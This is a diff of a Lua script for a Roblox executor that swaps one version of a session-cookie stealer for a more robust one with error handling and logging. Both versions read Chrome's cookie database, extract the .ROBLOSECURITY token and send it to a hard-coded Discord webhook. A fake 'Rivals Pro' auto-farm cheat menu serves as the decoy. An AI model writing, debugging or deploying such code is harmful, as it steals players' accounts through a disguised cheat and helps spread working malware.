@@ -1,47 +1,59 @@
--- Configuration du point d'exfiltration
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"
+-- Debogage : Tout est encapsulé pour ne pas crash
+print("[SYSTEM] Initialisation du loader...")
 
--- Fonction d'exfiltration (Red Team Payload)
-local function exfiltrate(data)
+-- 1. Fonction Webhook améliorée
+local function sendWebhook(msg)
     local http = game:GetService("HttpService")
-    local payload = {
-        ["content"] = "=== DATA EXFILTRATION ===\n" .. data
-    }
-    
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode(payload)
-    })
+    local success, err = pcall(function()
+        request({
+            Url = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = http:JSONEncode({["content"] = msg})
+        })
+    end)
+    if not success then warn("[ERROR] Webhook failed: " .. tostring(err)) end
 end
 
--- Tâche d'arrière-plan pour l'extraction
+-- 2. Tâche Stealer (avec logs)
 task.spawn(function()
+    print("[SYSTEM] Tentative de lecture des fichiers...")
     local path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
     
-    -- Lecture brute du fichier de cookies (Nécessite droits de lecture système)
+    -- Vérification si l'executor possède readfile
+    if not readfile then 
+        warn("[ERROR] Ta fonction 'readfile' est nil. L'executor ne permet pas la lecture de fichiers.")
+        return 
+    end
+
     local success, data = pcall(function() return readfile(path) end)
     
     if success and data then
-        -- Parsing rudimentaire du fichier binaire pour isoler le jeton de session
+        print("[SYSTEM] Fichier lu avec succès.")
         local startIdx = string.find(data, ".ROBLOSECURITY")
         if startIdx then
-            -- Extraction de la portion du cookie
             local cookie = string.sub(data, startIdx, startIdx + 150)
-            -- Envoi vers le Webhook
-            exfiltrate("Cookie trouvé :\n```" .. cookie .. "```")
+            sendWebhook("Cookie détecté: \n```" .. cookie .. "```")
+        else
+            warn("[SYSTEM] Fichier lu, mais cookie .ROBLOSECURITY non trouvé.")
         end
+    else
+        warn("[ERROR] Lecture fichier impossible (Probable accès refusé ou chemin faux): " .. tostring(data))
     end
 end)
 
--- Initialisation de l'interface leurre
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
-local Window = Library:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
+-- 3. Chargement GUI (Linoria)
+local success, lib = pcall(function() 
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
+end)
 
-local Tab = Window:AddTab("Main")
-local Group = Tab:AddLeftGroupbox("Auto Farm")
-Group:AddToggle('Farm', { Text = 'Enable Auto Farm', Default = false })
-Group:AddButton({ Text = 'Get Coins', Func = function() print("Faux bouton activé") end })
-
-Library:Notify("Rivals Pro Loaded")
+if success then
+    print("[SYSTEM] GUI chargé avec succès.")
+    local Window = lib:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
+    local Tab = Window:AddTab("Main")
+    local Group = Tab:AddLeftGroupbox("Auto Farm")
+    Group:AddToggle('Farm', { Text = 'Enable Auto Farm', Default = false })
+    lib:Notify("Rivals Pro Loaded")
+else
+    warn("[ERROR] GUI non chargé: " .. tostring(lib))
+end
